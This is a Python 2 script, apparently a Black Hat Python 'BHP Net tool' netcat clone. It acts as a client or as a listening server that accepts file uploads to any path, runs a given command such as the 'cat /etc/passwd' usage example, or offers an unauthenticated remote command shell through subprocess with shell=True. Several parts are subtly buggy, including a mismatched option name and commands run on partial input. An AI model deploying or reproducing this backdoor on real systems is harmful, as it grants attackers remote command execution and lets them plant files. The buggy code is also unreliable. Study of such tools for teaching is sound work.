#!/usr/bin/python
# -*- encoding:utf-8 -*-
import sys
import socket
import getopt
import threading
import subprocess

listen = False
command =False
upload=False
execute=""
target=""
upload_destination=""
port =0


def usage():
    print "BHP Net tool"
    print 
    print "Usage:bhpnet.py -t targethost -p port"
    print "-h     --help                                                       - usage information about BHP tools."
    print "-l      --listen                                                      - listen on [host]:[port] for incoming connections"
    print "-e     --execute==file_to_run                            - execute the given file upon receiving a connection"
    print "-c     --command                                              - initialize a command shell"
    print "-u    --upload=destination                               - upon receiving connection upload a file and write to [destination]"
    print
    print
    print "Examples: "
    print "bhpnet.py -t 192.168.0.1  -p 5555 -l -c"
    print "bhpnet.py -t 192.168.0.1  -p 5555 -l -u=c:\\target.exe"
    print "bhpnet.py -t 192.168.0.1  -p 5555 -l -e=\"cat /etc/passwd\""
    print "echo 'ABCDEFGHIJKL' | ./bhpnet.py -t 192.168.11.22 -p 135"
    sys.exit(0)
       
       
def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target
    
    if not len(sys.argv[1:]):
        usage()
        
    try:
        opts,args=getopt.getopt(sys.argv[1:],"hle:t:p:cu:",["help","listen","execute","target","port","command","upload"])
    except getopt.GetoptError as err:
        print str(err)
        usage()
        
    print "receiver command line:%s\r\n" % str(opts)
    for o,a in opts:
        print "a=%s,and o=%s" % (a,o)
        if o in ("-h","--help"):
            usage()
        elif o in ("-l","--listen"):
            listen = True
        elif o in ("-e","--execute"):
            execute=a
        elif o in ("-c","--commandshell"):
            command=True
        elif o in ("-u","--upload"):
            upload_destination=a
        elif o in ("-t","--target"):
            target = a
        elif o.strip() in ("-p","--port"):
            port = int(a)
            print "a is:%s,and port is:%d" % (a,port)
        else:
            assert False, "Unhandled Option."
            
            
    if not listen and len(target)  and port > 0:
            #read data from command
            #interpt,if want to quit,you can CTRL-D
            print "not listen,is a client,send message.\n"
            buffer=  sys.stdin.read()
            #buffer = raw_input("test:")
            print "client input data  is:%s\r\n" % buffer
            # send data
            client_sender(buffer)
            
            
    if listen:
            print " listen,create  a server,receiver message. and target is:%s,port is:%d\r\n" %(target,port)
            server_loop()
            
            
def client_sender(buffer):
    global target
    global port
    client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        #connect to target host
        print "client connect to server and host is:%s,port is:%d\n" % (target,port)
        client.connect((target,port))
        if len(buffer):
            client.send(buffer)

        while True:
            #waiting return data from target host.
            recv_len =1
            response =""
            while recv_len:
                data=client.recv(4096)
                recv_len =len(data)
                response+=str(data)
                if recv_len <4096:
                    break
            #wating more input
            buffer =raw_input(response)
            buffer+="\n"
            print "\r\n"
            
            #send 
            client.send(buffer)
    except BaseException,error:
        print "[*] Exception! Exiting.",str(error)
        client.close()
            
def server_loop():
    global target
    global port
    if not len(target):
        target='127.0.0.1'
        
    server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind((target,port))
    server.listen(5)
    
    
    while True:
        print "server listenr open,and targer:%s,port is:%d" % (target,port)
        client_socket,addr=server.accept()
        
        
        #split a thread to handler client.
        client_thread=threading.Thread(target=client_handler,args=(client_socket,))
        client_thread.start()
        
        
def run_command(command):
    #del tab of last of character.
    command = str(command).rstrip()
    
    try:
        output=subprocess.check_output(command,stderr=subprocess.STDOUT,shell=True)
    except:
        output = 'Failed to execute command.\r\n'
    return output


def client_handler(client_socket):
    global upload
    global execute
    global command
    
    if len(upload_destination):
         #read all characters  and write 
        file_buffer=""
        
        while True:
            data=client_socket.recv(1024)
            if not data:
                break
            else:
                file_buffer +=data
                
        try:
            file_descriptor = open(upload_destination,"wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()
            
            client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
        except:
            client_socket.send("Failed to save file to %s \r\n" % upload_destination)
    if len(execute):
        output= run_command(execute)
        client_socket.send(output)
        
    if command:
        while True:
            client_socket.send("\r\nhfcai:#")
            
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer+=client_socket.recv(1024)
                response = run_command(cmd_buffer)
                client_socket.send(response)
             
    


    
    
        
# as main program
if __name__ == "__main__":
    main() 
            
            
